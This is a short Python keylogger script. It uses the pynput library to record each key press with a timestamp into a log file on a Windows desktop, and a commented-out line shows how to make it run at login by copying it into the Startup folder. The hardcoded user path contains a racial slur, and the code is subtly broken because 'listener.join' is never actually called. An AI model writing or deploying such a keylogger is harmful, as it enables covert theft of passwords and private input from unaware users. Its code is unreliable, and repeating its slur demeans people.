from pynput.keyboard import Listener

import os
import logging
from shutil import copyfile

username = os.getlogin()

### Not Applicable to me because username issue
# 
#
#
# This is the correct code for a typical user below  
# logging_directory=f"C:/Users/{username}/Desktop"
logging_directory = "C:/Users/_Nigga/Desktop"

#logging.basicConfig(filename=f"{logging_directory}/mylog.txt", level = logging.DEBUG, format = "%(asctime)s: %(message)s:")
logging.basicConfig(filename="C:/Users/_Nigga/Desktop/mylog.txt", level = logging.DEBUG, format = "%(asctime)s: %(message)s:")


def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join

### how to set up run on startup###############################################################################
###copyfile("keylogger.py", f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/keylogger.py)###
###############################################################################################################
